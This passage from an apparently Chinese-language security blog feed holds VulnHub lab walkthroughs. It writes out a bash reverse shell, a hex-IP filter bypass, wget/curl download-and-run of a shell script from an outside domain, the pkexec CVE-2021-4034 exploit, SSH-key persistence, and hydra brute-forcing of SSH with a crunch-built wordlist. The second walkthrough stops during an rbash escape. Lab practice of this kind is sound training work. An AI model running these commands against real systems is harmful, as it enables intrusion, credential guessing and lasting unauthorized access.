&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;从最基础的反弹shell的命令尝试发现被过滤：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;quot;bash -i&amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;这里过滤的是ip地址，可将ip地址改为十六进制绕过：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/0xc0.0xa8.0x1f.0x87/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者连接到有域名的网址 [http://www.chentuo.asia](http://www.chentuo.asia)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;! /bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -c &amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;采用以下几种方法尝试下马执行&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://www.chentuo.asia/shell.sh &amp;amp;&amp;amp; chmod +x shell.sh &amp;amp;&amp;amp; ./shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget http://www.chentuo.asia/shell.sh &amp;amp;&amp;amp; sh shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;curl http://www.chentuo.asia/shell.sh | bash&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-078.png&#34; alt&gt;&lt;/p&gt;
&lt;ol start=&#34;2&#34;&gt;
&lt;li&gt;得到一个标准的 shell&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;#x27;import pty;pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#x27; then press Ctrl+Z&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg then press ENTER twice&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-079.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pkexec-权限提升&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pkexec-权限提升&#34;&gt;#&lt;/a&gt; Pkexec 权限提升&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看靶机上的pkexec是否存在s权限：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ls - Alh `which pkexec`&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;在攻击机kali上下载poc：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wget https://github.com/berdav/CVE-2021-4034/archive/refs/heads/main.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;解压poc：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;unzip master.zip&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;从靶机上获取poc：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;scp -r parallels@192.168.31.135:~/Desktop/tool/pkexec/CVE-2021-4034-main /tmp&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cd /tmp/CVE-2021-4034-main &amp;amp;&amp;amp; make &amp;amp; ./CVE-2021-4034&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-080.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;获取标准 shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-081.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;密钥对维权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#密钥对维权&#34;&gt;#&lt;/a&gt; 密钥对维权&lt;/h3&gt;
&lt;p&gt;提前准备好配对好的私钥和公钥，将公钥发到靶机&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;scp parallels@192.168.31.135:~/.ssh/id_rsa.pub ~/.ssh/&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat ~/.ssh/id_rsa.pub &amp;gt;&amp;gt; ~/.ssh/authorized_keys &amp;amp;&amp;amp; rm -f id_rsa.pub&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-082.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;ll | grep id&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh root@192.168.31.127 -i ~/.ssh/id_rsa&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-083.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 免密成功，下次可直接登录&lt;/p&gt;
</content>
        <category term="VULNHUB 1-10" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/108%20MATRIX/</id>
        <title>VULNHUB 8 MATRIX</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/108%20MATRIX/"/>
        <content type="html">&lt;p&gt;靶机下载地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvbWF0cml4LTEsMjU5Lw==&#34;&gt;https://www.vulnhub.com/entry/matrix-1,259/&lt;/span&gt;&lt;br&gt;
 教程链接地址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzU4MzYzNy9hcnRpY2xlL2RldGFpbHMvMTAyODQ1ODYw&#34;&gt;https://blog.csdn.net/weixin_43583637/article/details/102845860&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 MATRIX：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;通过 netdiscover 扫描当前网卡里边有哪些机器&lt;br&gt;
 &lt;code&gt;sudo netdiscover -i eth0 -r 192.168.31.0/24&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;将所有已知的 ip 暂时存档，对这类 ip 地址不做端口扫描&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; myip.txt &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.1 192.168.31.25 192.168.31.58 192.168.31.86 192.168.31.33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;192.168.31.120 192.168.31.135 192.168.31.145 192.168.31.162 192.168.31.44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;ol start=&#34;3&#34;&gt;
&lt;li&gt;去除一些已知 ip 的机器，对剩余 IP 进行端口扫描，判断目标 IP&lt;br&gt;
 &lt;code&gt;sudo nmap -PA 192.168.31.107 --excludefile myip.txt&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-128.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 目标机器的 ip 地址： 192.168.31.107&lt;/p&gt;
&lt;ol start=&#34;4&#34;&gt;
&lt;li&gt;确认靶机 ip 开放的端口信息&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;&lt;code&gt;sudo nmap -A -p- 192.168.31.107 -oN /tmp/matrix.txt&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-129.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22, 80, 31337&lt;/p&gt;
&lt;h3 id=&#34;80-网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#80-网站信息收集&#34;&gt;#&lt;/a&gt; 80 网站信息收集&lt;/h3&gt;
&lt;p&gt;右键发现无法检查源代码，先扫一遍目录&lt;br&gt;
 &lt;code&gt;dirsearch -u http://192.168.31.107/&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-130.png&#34; width=&#34;310&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 敏感网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cw==&#34;&gt;http://192.168.31.107/assets&lt;/span&gt;&lt;br&gt;
-&amp;gt; 找到敏感目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTA3L2Fzc2V0cy9pbWcvcDBydF8zMTMzNy5wbmc=&#34;&gt;http://192.168.31.107/assets/img/p0rt_31337.png&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-131.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;但是没有找到更多可以操作的，转到下个目标&lt;/p&gt;
&lt;h3 id=&#34;31337-网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#31337-网站信息收集&#34;&gt;#&lt;/a&gt; 31337 网站信息收集&lt;/h3&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-132.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;这里有一个提示暗号的意思，右键检查源代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-133.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;发现一串 base64 加密的字符，通过终端解密此密文&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;ZWNobyAiVGhlbiB5b3UnbGwgc2VlLCB0aGF0IGl0IGlzIG5vdCB0aGUgc3Bvb24gdGhhdCBiZW5kcywgaXQgaXMgb25seSB5b3Vyc2VsZi4gIiA+IEN5cGhlci5tYXRyaXg=&amp;quot; | base64 -d&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-134.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 得到文件名为 Cypher.matrix 的提示文件&lt;/p&gt;
&lt;p&gt;尝试访问 http://192.168.31.107:31337/Cypher.matrix&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-135.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;下载后得到一个文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-136.png&#34; alt&gt;&lt;/p&gt;
&lt;h3 id=&#34;brainfuck-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#brainfuck-解密&#34;&gt;#&lt;/a&gt; Brainfuck 解密&lt;/h3&gt;
&lt;p&gt;这是一个 brainfuck 加密，直接在线解密&lt;br&gt;
解密网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9jdGYuYnVna3UuY29tL3Rvb2wvYnJhaW5mdWNr&#34;&gt;https://ctf.bugku.com/tool/brainfuck&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-137.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名:guest 密码：k1ll0rXX&lt;br&gt;
 最后两位 XX 是未知的，需要进行爆破&lt;/p&gt;
&lt;h3 id=&#34;crunch-生成字典&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#crunch-生成字典&#34;&gt;#&lt;/a&gt; Crunch 生成字典&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看字典生成规则的lst文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat /usr/share/crunch/charset.lst ｜ grep lalpha&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-138.png&#34; alt&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;crunch 8 8 -f /usr/share/crunch/charset.lst lalpha-numeric -t k1ll0r@@ &amp;gt; pass.dic&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;Usage: crunch &amp;lt;min&amp;gt; &amp;lt;max&amp;gt; [options]. &lt;span class=&#34;built_in&#34;&gt;where&lt;/span&gt; min and max are numbers&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-f /path/to/charset.lst charset-name&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-139.png&#34; width=&#34;630&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;hydra-爆破-ssh&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hydra-爆破-ssh&#34;&gt;#&lt;/a&gt; Hydra 爆破 SSH&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;hydra -l guest -P pass.dic ssh://192.168.31.107 -f -t 4 -I -vV -o hydra.ssh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-l 指定用户guest -P 指定字典 -f 爆破密码成功后停止&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;-vV 显示详细过程 -o将爆破成功信息保存到文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-140.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-141.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 用户名:guest 密码：k1ll0r7n&lt;/p&gt;
&lt;h3 id=&#34;rbash逃逸&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rbash逃逸&#34;&gt;#&lt;/a&gt; Rbash 逃逸&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;ssh登陆到此台服务器&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ssh guest@192.168.31.107 k1ll0r7n&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-142.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现此会话窗口是 rbash，即做了限制的 bash&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看当前环境变量&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo $PATH&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo /home/guest/prog/*&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-143.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
